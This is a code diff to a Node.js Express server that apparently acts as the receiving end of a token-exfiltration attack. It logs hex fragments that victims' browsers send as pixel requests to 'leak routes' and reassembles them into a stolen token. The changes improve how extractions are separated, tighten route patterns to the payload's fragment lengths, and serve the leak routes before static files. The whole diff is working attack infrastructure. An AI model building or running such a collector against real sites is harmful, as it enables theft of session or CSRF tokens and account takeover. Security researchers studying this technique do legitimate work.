@@ -2,6 +2,7 @@ const express = require('express');
 const path = require('path');
 const crypto = require('crypto');
 const { tryStitch } = require('./lib/stitch');
+const { ANCHOR_LENGTH } = require('./public/payload');
 
 const G = '\x1b[32m';
 const R = '\x1b[31m';
@@ -142,14 +143,14 @@ function buildConfig(userConfig) {
 const app = express();
 const PORT = 3000;
 
-// The browser fires every request for one extraction in a single burst, but
-// they can arrive in any order and the start/end usually arrive before most
-// middle chunks. Stitching mid-burst can produce a plausible but wrong token,
-// so wait until no request has arrived for this long before stitching.
+// The browser fires every request for one extraction in a single burst, in
+// any order. A quiet gap of SETTLE_MS separates extractions: stitching waits
+// for it (stitching mid-burst can give a plausible but wrong token), and the
+// first request after it starts a fresh extraction.
 const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS ?? 1000);
 
 function emptyState() {
-  return { start: null, end: null, chunks: [], log: [], lastAt: 0, dirty: true, cached: null };
+  return { start: null, end: null, chunks: new Set(), lastAt: 0, dirty: true, cached: null };
 }
 
 let currentConfig, contextHexChunks, tokenLength, state;
@@ -164,8 +165,6 @@ function applyConfig(userConfig) {
 
 applyConfig(PRESETS.anchor);
 
-app.use(express.static(path.join(__dirname, 'public')));
-app.use('/graphics', express.static(path.join(__dirname, 'graphics')));
 app.use(express.json());
 
 app.get('/config', (req, res) => res.json(currentConfig));
@@ -182,48 +181,50 @@ app.post('/api/config', (req, res) => {
 
 function record(t, c, res) {
   const now = Date.now();
-  if (t === 's') {
-    // A start marks a new extraction, but requests from the same burst may
-    // have overtaken it, so keep anything that arrived just before it.
-    const early = state.log.filter(r => r.at >= now - SETTLE_MS);
+  // A quiet gap means the previous burst is over. A different start while one
+  // is in progress means a second extraction began right after the first
+  // (the start is normally the first request of a burst).
+  const newStart = t === 's' && state.start && state.start !== c;
+  if (now - state.lastAt > SETTLE_MS || newStart) {
     state = emptyState();
-    state.start = c;
-    for (const r of early) {
-      if (r.t === 'e') state.end = r.c;
-      else state.chunks.push(r.c);
-    }
-    state.log = early;
     console.log(`\n${G}--- new extraction ---${X}`);
+  }
+  if (t === 's') {
+    state.start = c;
     console.log(`${D}start:${X} ${c}`);
-    if (early.length) console.log(`${D}kept ${early.length} request(s) that arrived before the start${X}`);
   } else if (t === 'e') {
     state.end = c;
     console.log(`${D}end:${X}   ${c}`);
   } else {
-    state.chunks.push(c);
-    console.log(`${D}chunk #${state.chunks.length}:${X} ${c}`);
+    state.chunks.add(c);
+    console.log(`${D}chunk #${state.chunks.size}:${X} ${c}`);
   }
-  state.log.push({ t, c, at: now });
   state.lastAt = now;
   state.dirty = true;
   res.type('gif').send(PIXEL);
 }
 
-app.get('/s/:c([0-9a-f]+)', (req, res) => record('s', req.params.c, res));
-app.get('/e/:c([0-9a-f]+)', (req, res) => record('e', req.params.c, res));
-app.get('/:c([0-9a-f]+)', (req, res) => record('m', req.params.c, res));
+// Leak routes come before the static files so each pixel skips a disk lookup.
+// Paths only match the lengths the payload uses, which also bounds memory.
+const anchor = `[0-9a-f]{${ANCHOR_LENGTH}}`;
+app.get(`/s/:c(${anchor})`, (req, res) => record('s', req.params.c, res));
+app.get(`/e/:c(${anchor})`, (req, res) => record('e', req.params.c, res));
+app.get('/:c([0-9a-f]{3,4})', (req, res) => record('m', req.params.c, res));
+
+app.use(express.static(path.join(__dirname, 'public')));
+app.use('/graphics', express.static(path.join(__dirname, 'graphics')));
 
 app.get('/api/token', (req, res) => {
   if (!state.start) {
     return res.json({ status: 'waiting' });
   }
   if (Date.now() - state.lastAt < SETTLE_MS) {
-    return res.json({ status: 'partial', start: state.start, end: state.end, chunks: state.chunks.length });
+    return res.json({ status: 'partial', start: state.start, end: state.end, chunks: state.chunks.size });
   }
   if (!state.dirty && state.cached) {
     return res.json(state.cached);
   }
-  const result = tryStitch(state, {
+  const result = tryStitch({ ...state, chunks: [...state.chunks] }, {
     windowSize: currentConfig.windowSize,
     tokenLength,
     context: contextHexChunks,
@@ -248,7 +249,7 @@ app.get('/api/token', (req, res) => {
       status: 'partial',
       start: state.start,
       end: state.end,
-      chunks: state.chunks.length,
+      chunks: state.chunks.size,
     };
   }
   state.dirty = false;
